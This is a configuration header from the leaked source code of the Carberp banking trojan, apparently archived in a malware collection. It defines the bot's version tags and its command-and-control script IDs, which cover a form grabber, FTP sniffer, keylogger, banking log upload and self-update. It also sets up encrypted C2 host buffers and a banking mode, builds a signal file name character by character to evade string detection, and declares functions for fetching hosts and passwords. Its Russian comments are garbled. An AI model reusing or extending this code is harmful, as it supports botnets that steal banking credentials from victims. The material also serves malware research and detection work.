/*
  name      Carberp Botnet
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    krisyotam
  archived  krisyotam (2026)
  notes     —
 */
#ifndef ConfigH
#define ConfigH
//----------------------------------------------------------------------------

#include <windows.h>
#include "Strings.h"


//****************************************************
//  ���������� � ������ ����
//  ������������ ������:
//
//  Major.Minor.Release
//  1.0.0
//
//  ����������� �������������� ������ �������!!
//****************************************************
#define BOT_VERSION "1.3.0"

#define BOT_VERSION_HEADER      "_BT_VER:"
#define BOT_VERSION_HEADER_HASH 0xFA6E639F /* _BT_VER: */
#define BOT_VERSION_HEADER_SIZE 8


//****************************************************
//  ���������� ��� DEBUGCONFIG ���� ���������� ���-��
//  ��� ����������� ���������� ���������
//****************************************************
#if !defined(DEBUGCONFIG) && defined(DEBUGBOT)
	#define DEBUGCONFIG
#endif



//****************************************************
//  ��������� ��������� ������������� ����������
//  �������� � ������ BANKING
//
//  � ������ bot.plug ����� ���������
//****************************************************
#ifndef BOTPLUG
    //#define USE_BANKING_PREFIX
#endif


//****************************************************
//  ����� �������� ������������� ��������� ������ �
//  ������ BANKING
//****************************************************
//#define USE_BANKING_HOSTS



// ���������, ������ ��������

#define SCRIPT_FORM_GRABBER  1  /* ������ �������� ������ HTML ���� */
#define SCRIPT_TASK          2  /* ������ �������� ����� */
#define SCRIPT_PLUGINS       3  /* ������ �������� �������� */
#define SCRIPT_FTP_SNIFFER   4  /* ������ �������� ������ FTP ��������� */
#define SCRIPT_FIRST_INFO    5  /* ������ �������� ������� � ������� */
#define SCRIPT_GRABBER       6  /* ������ �������� ������������ ������ */
#define SCRIPT_CAB           7  /* ������ �������� ������������ ������ */
#define SCRIPT_HUNTER        8  /* ����� ������� ��������� ������ ������ Hunter */
#define SCRIPT_COMMENT       9  /* ����� ������� ��������� ������ ������ Hunter */
#define SCRIPT_PLUGINS_LIST  10 /* ����� ������� ��������� ���������� � ��������� �������� �� ������� */
#define SCRIPT_KEYLOGGER     11 /* ����� �������, ���� ����� ������������ ������ ��������� */
#define SCRIPT_REMOTE_LOG    12 /* ������ ��������� ����������� */
#define SCRIPT_UPDATE_HOSTS  13 /* ������ ���������� ������ ������ */
#define SCRIPT_UPDATE_BOT    14 /* ������  ��������������� ���������� ����� */
#define SCRIPT_IBANK_LOG     15 /* ������ ����� ����� ������ */
#define SCRIPT_PLUGIN        16 /* ������ ��������� ����� ������ ������� */


// ������������ ������� �������� � �������
#define MAX_MAINHOSTS_BUF_SIZE 500 /* ������ ������ �������� ������ */
#define MAX_BANKHOSTS_BUF_SIZE 500 /* ������ ������ �������� ������ �������� ����� */
#define MAX_PASSWORD_SIZE      64  /* ������ ������ �������� ��������� ������ */
#define MAX_PREFIX_SIZE        20  /* ������ ������ ��� �������� ���� */
#define MAX_DELAY_SIZE         8   /* ����� ��� �������� �������� */
#define MAX_BOT_PLUG_NAME_SIZE 100 /* ����� ��� �������� ����� �������� */
#define MAX_SESSION_PASSW_SIZE 10  /* ������ ������ �������� ������ ���������� ������ */



// ����� ����������

#define BOTPARAM_PREFIX        "BOT_UID"
#define BOTPARAM_MAINHOSTS     "ALL_HOSTS_BUFFER\0\0"
#define BOTPARAM_BANKHOSTS     "CAB_HOSTS_BUFFER\0\0"
#define BOTPARAM_DELAY         "DELAY_"
#define BOTPARAM_MAINPASSWORD  "MAIN_PASSWORD"
#define BOTPARAM_PLUG_NAME     "PLUG_NAME"
#define BOTPARAM_SESSION_PASSW "ESTR_PASS_"



// ������� ������ � ��������� ����� ����������� �����
// ������ ���� ����� ������ ��������� ������� ������
// � ��������� ��� ������ �� ������� ���������
#define ENCRYPTED_STRINGS_BEGIN "CSBEGIN"
#define ENCRYPTED_STRINGS_END   "CSEND"



//���� ��� ����������

#define BOTPARAM_HASH_BANKHOSTS  0x998F4828 /* CAB_HOSTS_BUFFER */
#define BOTPARAM_HASH_MAINHOSTS  0xE98F4C1C /* ALL_HOSTS_BUFFER */
#define BOTPARAM_HASH_PASSWORD   0x618ADDBE /* MAIN_PASSWORD */
#define BOTPARAM_HASH_DELAY      0x59906EFB /* DELAY_ */

// ��������� ���������� ����������
#ifndef DEBUGCONFIG
	#define BOTPARAM_ENCRYPTED_MAINHOSTS true
	#define BOTPARAM_ENCRYPTED_BANKHOSTS true
	#define BOTPARAM_ENCRYPTED_PREFIX    true
	#define BOTPARAM_ENCRYPTED_PASSWORD  true
#else
	#define BOTPARAM_ENCRYPTED_MAINHOSTS false
	#define BOTPARAM_ENCRYPTED_BANKHOSTS false
	#define BOTPARAM_ENCRYPTED_PREFIX    false
	#define BOTPARAM_ENCRYPTED_PASSWORD  false
#endif


#define DEFAULT_DELAY  10 /* �������� �� ��������� */


//--------------------------------------------------------
//  �� ����������� ����� ������ ����
//  ���� ���� � ����� ������ ����� ������ � ����������
//  Application Data...��������� ����������
//--------------------------------------------------------
#ifdef USE_BANKING_PREFIX
	const static char BANKING_SIGNAL_FILE[] = {'p','r','f','b','n','s','m','t','.','i','n','i', 0};
#endif
const DWORD BANKING_SIGNAL_FILE_HASH = 0x2709A4B5; /* prfbnsmt.ini */


//--------------------------------------------
//  GetBotVersion - ������� ���������� ������
//                  � ������� ����
//--------------------------------------------
PCHAR GetBotVersion();


//--------------------------------------------
//  GetBotHosts
// ������� ���������� ��������� ��
// ������ ������ ����
//--------------------------------------------
PCHAR GetBotHosts();

//------------------------------------------------------------------
//  GetActiveHost - ������� ���������� ������ ������� ����
//					� ������ ������ ������� ���������� ����� ������
//------------------------------------------------------------------
//PCHAR GetActiveHost();
string GetActiveHost(bool CheckBankingMode = true);


//------------------------------------------------------------------
//  SaveHostsToFile - ������� ���������� ����� � ����
//------------------------------------------------------------------
void SaveHostsToFile(const char* FileName);

//------------------------------------------------------------------
//  SavePrefixToFile - ������� ���������� ������� � ����
//------------------------------------------------------------------
void SavePrefixToFile(const char* FileName);

//------------------------------------------------------------------
//  LoadPrefixFromFile - ������� ��������� ������� �� �����
//------------------------------------------------------------------
string LoadPrefixFromFile(const char* FileName);


//-------------------------------------------------------------------
//  IsMainHost - ������� ���������� ������ ����
//  ��������� ���� ����������� ������� �������� ������ ����
//-------------------------------------------------------------------
bool IsMainHost(const char* Host);

//------------------------------------------------------------------
//  GetActiveHostFromBuf - ������� ���������� ���� �� ������
//
//  Hosts - ��������� �� ������������������ ������������� �����
//          ������������� ������ �������. ������� ������ �����
//			������ ����.
//
//  EmptyArrayHash - ��� ���������������� ������ ������ �������.
//                   ������������ ��� �������� ����� ������ �
//  				 ������ ���������
//
//  Encrypted - �������� ����, ��� ������ �����������
//------------------------------------------------------------------
PCHAR GetActiveHostFromBuf(PCHAR Hosts, DWORD EmptyArrayHash);
string GetActiveHostFromBuf2(const char* Hosts, DWORD EmptyArrayHash, bool Encrypted);



// ������� ���������� ������ ��� ����������� �����������/������������ ������
PCHAR GetMainPassword();
string GetMainPassword2(bool NotNULL = false);

//------------------------------------------------------------------------
// GetSessionPassword - ������� ���������� ��������� �� ������ ���
//                      ���������� ���������� ������
//------------------------------------------------------------------------
PCHAR GetSessionPassword();

//------------------------------------------------------------------------
//  GetBotScriptURL - ������� ���������� ������ ����� ���������� �������
//  ���� ������� Path �� ����� ����������� ���� ����, � ��������� ������
//  ����� �������������� ���� ����������� ��� ������� � ������� Script
//
//  CheckBankingMode - �������� ��������� ����� ������. ����
//					   CheckBankingMode == true � ��� ��������� � ������
//				       Banking, �� ����� ����� ������� �� ������� ������
//					   Banking �������
//------------------------------------------------------------------------
PCHAR GetBotScriptURL(DWORD Script, PCHAR Path = NULL, bool CheckBankingMode = true);



//-----------------------------------------------------
//  GetBankingScriptURL-  ������� ���������� �����
//		������� � ��������� ����������� ������ Banking
//-----------------------------------------------------
//string GetBankingScriptURL(DWORD Script, bool CheckBankingMode);



// ������� ���������� ���������� ��� �������
// Exts - ������ ����������, ��������������� ������� ����������
PCHAR GenerateRandomScript(DWORD Min1, DWORD Max1, DWORD Min2, DWORD Max2, PCHAR *Exts);

int GetDelay();

string GetPrefix(bool CheckBankingMode = false);



void SetBankingMode(bool IsBanking = true);
bool IsBankingMode();


//------------------------------------------------------------------------
//  �������������� ���������� ����
//------------------------------------------------------------------------
#define BOT_PARAM_PREFIX       1   /* ������� ����  */
#define BOT_PARAM_HOSTS        2   /* ����� ���� */
#define BOT_PARAM_KEY          3   /* ���� �� �������� */
#define BOT_PARAM_DELAY        4   /* ����� ������� */
#define BOT_PARAM_BOTPLUGNAME  5   /* ��� �������� */
#define BOT_PARAM_BANKINGHOSTS 6   /* ����� ������� � BANKING ������ */



//------------------------------------------------------------------------
//  GetBotParameter - ������� ���������� ������� ����
//
//  ParamID - ������������� ���������
//
//  Buffer - �����, ���� ����� �������� ��������
//
//  BufSize -  ������ ������
//
//  ���������: ������� ������ ���������� ���������� � ����� ����
//			   ���� �������� � �������� ������ NULL �� ������� ������
// 			   ������ ������.
//------------------------------------------------------------------------
DWORD WINAPI GetBotParameter(DWORD ParamID, PCHAR Buffer, DWORD BufSize);


//------------------------------------------------------------------------
//  SetBotParameter - ������� ������������� �������� ����
//
//  ParamID -  ������������� ��������
//
//  Param - ������ �������������� ���� �� ��������� ���������
//          ���� ��������������� �������� ����� (BOT_PARAM_HOSTS)
//			�� ����������� ����� ������ ������� �������� ���� �� �����
//			������� ��������, ����� ���������� ����� ������ ������ ���
//			������� �������. �.�. ����� ������ ������������� ������
//			�������. ������ ���� ������ ���� ����������.
//			��� �������� ����� ������� ������� ������ ���� ������������
//------------------------------------------------------------------------
BOOL WINAPI SetBotParameter(DWORD ParamID, PCHAR Param);


//������� � BotCore.h
extern char BOT_UID[128];



//-------------------------------------------------------
// ������� ��������� ����������������� ���������� �����
//-------------------------------------------------------
bool CheckHost(const char* Host);



//----------------------------------------------------------------------------
#endif

